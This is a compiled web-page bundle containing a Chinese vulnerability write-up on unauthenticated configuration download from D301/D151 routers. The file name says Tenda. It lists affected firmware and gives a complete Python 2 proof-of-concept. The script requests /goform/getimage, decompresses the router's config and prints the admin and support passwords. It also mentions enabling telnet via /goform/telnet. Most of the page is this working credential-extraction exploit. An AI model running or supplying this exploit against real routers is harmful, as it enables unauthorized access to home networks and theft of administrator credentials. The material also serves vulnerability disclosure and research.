import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as p}from"./app-58e4a7d6.js";const t={},e=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>攻击者可利用此漏洞，通过请求{IP}/goform/getimage即可下载当前路由器配置（包括管理员登录名），也可以通过请求激活telnet服务/goform/telnet（默认情况下该服务已启用）。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>D301 1.2.11.2_EN
D301 V2.0 50.22.1.8_EN
D151 V2.0 50.21.1.5_EN
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> struct
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> random<span class="token punctuation">,</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64



FETCH_CODE <span class="token operator">=</span> <span class="token string">&quot;\\x80\\x0f\\x07\\xe7\\x83i\\xb0@v2\\x9c\\x8ef\\x93y\\xb8z&quot;</span>
ADMIN_LOG_CFG <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;AdminPassword&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;admin&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;SupportPassword&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;support&#39;</span><span class="token punctuation">}</span>

CLEAR_CODE <span class="token operator">=</span> <span class="token number">256</span>
END_OF_CODE <span class="token operator">=</span> CLEAR_CODE <span class="token operator">+</span> <span class="token number">1</span>

MIN_WIDTH <span class="token operator">=</span> <span class="token number">8</span>
DEFAULT_MIN_BITS <span class="token operator">=</span> MIN_WIDTH <span class="token operator">+</span> <span class="token number">1</span>
DEFAULT_MAX_BITS <span class="token operator">=</span> <span class="token number">12</span>




<span class="token keyword">def</span> <span class="token function">cmsDecoder</span><span class="token punctuation">(</span>compressed_cfg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    _cp_dict <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> pt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> pt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    _cp_dict<span class="token punctuation">[</span>CLEAR_CODE<span class="token punctuation">]</span> <span class="token operator">=</span> CLEAR_CODE
    _cp_dict<span class="token punctuation">[</span>END_OF_CODE<span class="token punctuation">]</span> <span class="token operator">=</span> END_OF_CODE
    prefix<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> ignore <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
    codepoints_arr<span class="token punctuation">,</span> remainder<span class="token punctuation">,</span> bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    init_csize <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>_cp_dict<span class="token punctuation">)</span>

    codesize <span class="token operator">=</span> init_csize
    minwidth <span class="token operator">=</span> MIN_WIDTH
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> minwidth<span class="token punctuation">)</span> <span class="token operator">&lt;</span> codesize<span class="token punctuation">:</span>
        minwidth <span class="token operator">=</span> minwidth <span class="token operator">+</span> <span class="token number">1</span>
    pointwidth <span class="token operator">=</span> minwidth

    buts_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> compressed_cfg<span class="token punctuation">:</span>
        value <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> bitplusone <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bitindex <span class="token operator">=</span> bitplusone <span class="token operator">-</span> <span class="token number">1</span>
            buts_arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>value <span class="token operator">&gt;&gt;</span> bitindex<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> nextbit <span class="token keyword">in</span> buts_arr<span class="token punctuation">:</span>
        offset <span class="token operator">=</span> <span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span>
        <span class="token keyword">if</span> ignore <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            ignore <span class="token operator">=</span> ignore <span class="token operator">-</span> <span class="token number">1</span>
            <span class="token keyword">continue</span>
        bits<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nextbit<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span> <span class="token operator">==</span> pointwidth<span class="token punctuation">:</span>
            cp_int <span class="token operator">=</span> <span class="token number">0</span>
            lsb_first <span class="token operator">=</span> <span class="token punctuation">[</span>b <span class="token keyword">for</span> b <span class="token keyword">in</span> bits<span class="token punctuation">]</span>
            lsb_first<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> bit_index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lsb_first<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> lsb_first<span class="token punctuation">[</span>bit_index<span class="token punctuation">]</span><span class="token punctuation">:</span>
                    cp_int <span class="token operator">=</span> cp_int <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bit_index<span class="token punctuation">)</span>

            bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            codepoints_arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cp_int<span class="token punctuation">)</span>
            codesize <span class="token operator">=</span> codesize <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">if</span> cp_int <span class="token keyword">in</span> <span class="token punctuation">[</span>CLEAR_CODE<span class="token punctuation">,</span> END_OF_CODE<span class="token punctuation">]</span><span class="token punctuation">:</span>
                codesize <span class="token operator">=</span> init_csize
                pointwidth <span class="token operator">=</span> minwidth
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">while</span> codesize <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> pointwidth<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    pointwidth <span class="token operator">=</span> pointwidth <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">if</span> cp_int <span class="token operator">==</span> END_OF_CODE<span class="token punctuation">:</span>
                ignore <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> offset<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span>


    decodedBytes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> cp_int <span class="token keyword">in</span> codepoints_arr<span class="token punctuation">:</span>

        suffix <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
        <span class="token keyword">if</span> cp_int <span class="token operator">==</span> CLEAR_CODE<span class="token punctuation">:</span>
            _cp_dict <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> pt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> pt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            _cp_dict<span class="token punctuation">[</span>CLEAR_CODE<span class="token punctuation">]</span> <span class="token operator">=</span> CLEAR_CODE
            _cp_dict<span class="token punctuation">[</span>END_OF_CODE<span class="token punctuation">]</span> <span class="token operator">=</span> END_OF_CODE
            prefix <span class="token operator">=</span> <span class="token boolean">None</span>

        <span class="token keyword">elif</span> cp_int <span class="token operator">!=</span> END_OF_CODE<span class="token punctuation">:</span>
            <span class="token keyword">if</span> cp_int <span class="token keyword">in</span> _cp_dict<span class="token punctuation">:</span>
                suffix <span class="token operator">=</span> _cp_dict<span class="token punctuation">[</span>cp_int<span class="token punctuation">]</span>
                <span class="token keyword">if</span> <span class="token boolean">None</span> <span class="token operator">!=</span> prefix<span class="token punctuation">:</span>
                    _cp_dict<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>_cp_dict<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> prefix <span class="token operator">+</span> suffix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                suffix <span class="token operator">=</span> prefix <span class="token operator">+</span> prefix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                _cp_dict<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>_cp_dict<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> suffix
            prefix <span class="token operator">=</span> suffix
        decoded <span class="token operator">=</span> suffix
        <span class="token keyword">for</span> char <span class="token keyword">in</span> decoded<span class="token punctuation">:</span>
            decodedBytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
    <span class="token keyword">return</span> decodedBytes






<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">&quot;[!] Downloading config&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;http://{}/goform/getimage&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">&quot;[-] Failed to download the config, the target may not be vulnerable&quot;</span>

    BIN_CONTENT <span class="token operator">=</span> r<span class="token punctuation">.</span>content
    BIN_CONTENT <span class="token operator">=</span> BIN_CONTENT<span class="token punctuation">[</span>BIN_CONTENT<span class="token punctuation">.</span>index<span class="token punctuation">(</span>FETCH_CODE<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">]</span>

    CONFIG_XML <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmsDecoder<span class="token punctuation">(</span>BIN_CONTENT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    USER_<span class="token punctuation">,</span> PASS_ <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> ADMIN_LOG_CFG<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token keyword">in</span> CONFIG_XML<span class="token punctuation">:</span>
            CONFIG_XML <span class="token operator">=</span> CONFIG_XML<span class="token punctuation">[</span>CONFIG_XML<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            PASS_ <span class="token operator">=</span> CONFIG_XML<span class="token punctuation">[</span><span class="token punctuation">:</span>CONFIG_XML<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">&#39;&lt;/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            USER_ <span class="token operator">=</span> ADMIN_LOG_CFG<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            <span class="token keyword">print</span> <span class="token string">&quot;\\tusername: {}\\n\\tpassword: {}\\n&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>USER_<span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>PASS_<span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&#39;\\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">print</span> <span class="token string">&quot;[-] Failed to decode the config file\\n&quot;</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>



<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token string">&quot;usage: python2 &quot;</span> <span class="token operator">+</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">&quot; router_ip&quot;</span>
    <span class="token keyword">print</span> <span class="token string">&quot;example: python2 exploit.py http://192.168.1.1&quot;</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;\\
        _  _
  ___ (~ )( ~)
 /   \\_\\ \\/ /   
|   D_ ]\\ \\/  -- By BenCh@li@h
|   D _]/\\ \\  -- BenChaliah@github
 \\___/ / /\\ \\\\
      (_ )( _)
          
&quot;&quot;&quot;</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exploit<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7),o=[e];function i(c,l){return s(),a("div",null,o)}const k=n(t,[["render",i],["__file","腾达 路由器 D151D31未经身份验证的配置下载.html.vue"]]);export{k as default};
